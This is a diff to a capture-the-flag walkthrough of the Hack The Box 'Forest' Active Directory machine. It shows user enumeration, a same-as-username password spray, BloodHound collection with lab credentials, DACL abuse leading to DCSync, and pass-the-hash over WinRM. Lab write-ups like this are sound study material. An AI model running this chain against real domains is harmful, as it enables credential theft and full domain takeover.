@@ -61,21 +61,7 @@ Host script results:
 
 ```
 
-Some key services:
-
-    389 / 3268 LDAP
-
-    88 Kerberos
-
-    445 SMB
-
-    5985 WinRM
-
-    Domain: htb.local
-
-    Hostname: FOREST
-
-I add the domain to /etc/hosts:
+I will add the domain name we got from nmap to /etc/hosts:
 
 ```bash
 ─$ echo "10.129.162.127 htb.local" | sudo tee -a /etc/hosts                                  
@@ -119,7 +105,8 @@ FQDN: FOREST.htb.local
 
 I cleaned the output to get just usernames:
 
-```bash─$ enum4linux-ng 10.129.162.127 | grep "username" | grep -v "SM\|Health"| cut -d ":" -f 2
+```bash
+─$ enum4linux-ng 10.129.162.127 | grep "username" | grep -v "SM\|Health"| cut -d ":" -f 2
 [+] Server allows session using username '', password ''
  sebastien
  lucinda
@@ -133,9 +120,11 @@ I cleaned the output to get just usernames:
  DefaultAccount
 ```
 
+
 ## Foothold
 
-Since we don`t have anymore information, let’s test if any users have the same password as their username:
+Since we don`t have anymore information, let’s test if any users have the same password as their username
+
 ```bash
 └─$ nxc smb 10.129.162.127 -u users -p users --continue-on-success -k
 SMB         10.129.162.127  445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
@@ -242,7 +231,7 @@ User claims unknown.
 
 The Account Operators, IT Acoounts and Service Accounts are all intersting groups.
 
-Lets ran BloodHound to see where this gets us:
+Lets ran BloodHound to see where this gets us.
 
 ```bash
 └─$ bloodhound-python -c ALL --zip -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.162.127
@@ -268,15 +257,15 @@ INFO: Done in 00M 11S
 INFO: Compressing output into 20250806082113_bloodhound.zip
 ```
 
-and upload the data to Bloodhound, quering for shortest path to Domain Admins we see the following
+and upload the data to Bloodhound, quering for shortest path to Domain Admins we see the following:
 
 <img width="2709" height="1295" alt="2025-08-06 142327" src="https://github.com/user-attachments/assets/3a90ab2d-feee-4641-8304-0417f80081a7" />
 
-## Exploitation Chain
+### Exploitation Chain
 
  1. Since we are in the Account Operators group, we have GenericAll privilege over EXCHANGE WINDOWS PERMISSIONS, we will add ourselves to that group.
 
- 2. From EXCHANGE WINDOWS PERMISSIONS, we have permission to modify the DACL (Discretionary Access Control List) on the HTB.LOCAL domain.
+ 2. From EXCHANGE WINDOWS PERMISSIONS, we have permission to modify the DACL (Discretionary Access Control List) on the HTB.LOCAL domain, granting us full control.
 
  3. From here, we can perform a DC Sync attack.
 
@@ -308,9 +297,10 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] DACL modified successfully!
 ```
 
-Step 3: Perform DCSync attack with secretsdump
+Step 3: Perform DCSync attack with impackets secretsdump
 
-<img width="1998" height="1398" alt="2025-08-06 144511" src="https://github.com/user-attachments/assets/29058a7b-2b00-4891-963c-e816c02f05da" />
+<img width="1998" height="1398" alt="2025-08-06 144511" src="https://github.com/user-attachments/assets/c55ceab1-49b6-4fac-a25b-fef7f715ff0e" />
+
 
 Nice! Now we can use the dumped NTLM hash to connect as Administrator via WinRM:
 
